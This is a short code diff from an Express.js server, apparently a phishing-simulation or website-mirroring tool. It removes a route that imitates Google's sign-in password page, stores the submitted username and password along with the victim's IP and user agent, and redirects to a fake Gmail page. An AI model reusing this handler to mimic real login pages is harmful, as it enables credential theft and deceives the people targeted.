@@ -154,34 +154,6 @@ app.all('/api/cors-proxy/:sessionToken', async (req, res) => {
   }
 });
 
-// Google simulation form handler
-app.post('/:sessionToken/accounts.google.com/signin/v2/challenge/pwd', async (req, res) => {
-  try {
-    const sessionToken = req.params.sessionToken;
-    const { identifier, passwd, _fstrike_track } = req.body;
-    
-    console.log(`🎭 Google simulation form submission for session: ${sessionToken}`);
-    console.log(`📧 Captured credentials: ${identifier} / ${passwd ? '[HIDDEN]' : '[NO PASSWORD]'}`);
-    
-    // Store the credentials
-    await websiteMirroringService.handleGoogleSimulationSubmission(sessionToken, {
-      username: identifier,
-      password: passwd,
-      trackingId: _fstrike_track,
-      ip: req.ip,
-      userAgent: req.get('User-Agent')
-    });
-    
-    // Simulate successful login by redirecting to a success page
-    const continueUrl = req.body.continue || `/${sessionToken}/mail.google.com/mail/u/0/`;
-    res.redirect(continueUrl);
-    
-  } catch (error) {
-    console.error('Error handling Google simulation:', error);
-    res.status(500).send('Authentication failed');
-  }
-});
-
 // Handle preflight CORS requests
 app.options('*', (req, res) => {
   res.header('Access-Control-Allow-Origin', '*');
